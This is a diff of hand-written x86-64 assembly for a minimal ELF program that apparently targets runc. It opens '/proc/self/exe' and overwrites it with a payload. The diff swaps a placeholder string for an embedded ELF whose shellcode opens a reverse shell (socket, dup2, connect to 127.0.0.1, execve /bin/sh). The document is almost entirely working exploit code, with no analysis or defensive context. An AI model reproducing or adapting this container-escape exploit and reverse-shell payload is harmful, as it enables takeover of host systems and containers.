@@ -1,36 +1,38 @@
 BITS 64
+org 0x400000
 
+; ELF Header
 ehdr:
+    ; https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html
     db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
-    db      0, 0, 0, 0, 0, 0, 0, 0
-    dw      3                               ;   e_type
-    dw      0x3E                            ;   e_machine
-    dd      1                               ;   e_version
-    dq      _start                          ;   e_entry
-    dq      phdr - $$                       ;   e_phoff
-    dq      0                               ;   e_shoff
-    dd      0                               ;   e_flags
-    dw      ehdrsize                        ;   e_ehsize
-    dw      phdrsize                        ;   e_phentsize
+    times 8 db 0
+    dw      3                               ;   e_type: Shared object file
+    dw      0x3E                         ;   e_machine: Advanced Micro Devices X86-64
+    dd      1                               ;   e_version: Current version
+    dq      _start                          ;   e_entry: This member gives the virtual address to which the system first transfers control, thus starting the process. If the file has no associated entry point, this member holds zero.
+    dq      phdr - $$                    ;   e_phoff: This member holds the program header table's file offset in bytes. If the file has no program header table, this member holds zero.
+    dq      0                               ;   e_shoff: This member holds the section header table's file offset in bytes. If the file has no section header table, this member holds zero.
+    dd      0                               ;   e_flags: This member holds processor-specific flags associated with the file. Flag names take the form EF_machine_flag.
+    dw      ehdrsize                    ;   e_ehsize: This member holds the ELF header's size in bytes.
+    dw      phdrsize                    ;   e_phentsize: This member holds the size in bytes of one entry in the file's program header table; all entries are the same size.
     dw      1                               ;   e_phnum
     dw      0                               ;   e_shentsize
     dw      0                               ;   e_shnum
     dw      0                               ;   e_shstrndx
+    ehdrsize equ $ - ehdr; ***************changed********************
 
-ehdrsize equ $ - phdr
-
+; Program header table
 phdr:
-phdr_load:
+;phdr_load:
     dd      1                               ;   p_type
     dd      7                               ;   p_flags
     dq      0                               ;   p_offset
     dq      $$                              ;   p_vaddr
     dq      $$                              ;   p_paddr
-    dq      filesize                        ;   p_filesz
-    dq      filesize                        ;   p_memsz
-    dq      0x1000                          ;   p_align
-
-phdrsize    equ $ - phdr
+    dq      filesize                       ;   p_filesz
+    dq      filesize                       ;   p_memsz
+    dq      0x1000                       ;   p_align
+    phdrsize    equ $ - phdr
 
 global _start
 
@@ -80,7 +82,8 @@ open:
     mov rax, SYS_OPEN
     mov rdx, 0
     mov rsi, O_RDONLY                          ;flags
-    mov rdi, runc                                       ;filename
+    ;mov rdi, runc                                       ;filename
+    lea rdi, [rel runc]
     syscall
 
 ; *******************
@@ -102,7 +105,8 @@ splice:
 ; *******************
 write_payload: 
     mov rdx, MAX_LENGTH                                ; length
-    mov rsi,   payload                                             ; payload
+    ;mov rsi,   payload                                             ; payload
+    lea rsi, [rel payload]
     mov edi, [rsp+4]                                       ; p[1]
     mov rax, SYS_WRITE
     syscall
@@ -115,7 +119,7 @@ exit:
     xor       rdi, rdi                      ; exit code 0
     syscall                               ; invoke operating system to exit
 
-section .data
+;section .data
     ; ********syscall*******
     SYS_READ:                   equ 0
     SYS_WRITE:                  equ 1
@@ -130,12 +134,11 @@ section .data
     O_RDONLY           equ    000000q        ; read only
     BUFF_SIZE          equ 255
     PAGE_SIZE           equ 65536
-    MAX_LENGTH equ 10
+    MAX_LENGTH equ 151
     ; ********string*******
-    runc db '/tmp/fd',NULL ; runc fd
-    payload db "st0n3st0n3"
+    runc db '/proc/self/exe',NULL ; runc fd
+    ;payload db 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+    payload: db 69, 76, 70, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 3, 0, 1, 0, 0, 0, 84, 128, 4, 8, 52, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 52, 0, 32, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 128, 4, 8, 0, 128, 4, 8, 152, 0, 0, 0, 220, 0, 0, 0, 7, 0, 0, 0, 0, 16, 0, 0, 49, 219, 247, 227, 83, 67, 83, 106, 2, 137, 225, 176, 102, 205, 128, 147, 89, 176, 63, 205, 128, 73, 121, 249, 104, 127, 0, 0, 1, 104, 2, 0, 91, 37, 137, 225, 176, 102, 80, 81, 83, 179, 3, 137, 225, 205, 128, 82, 104, 110, 47, 115, 104, 104, 47, 47, 98, 105, 137, 227, 82, 83, 137, 225, 176, 11, 205, 128
 
 ;section    .bss
-
-
 filesize equ $ - $$
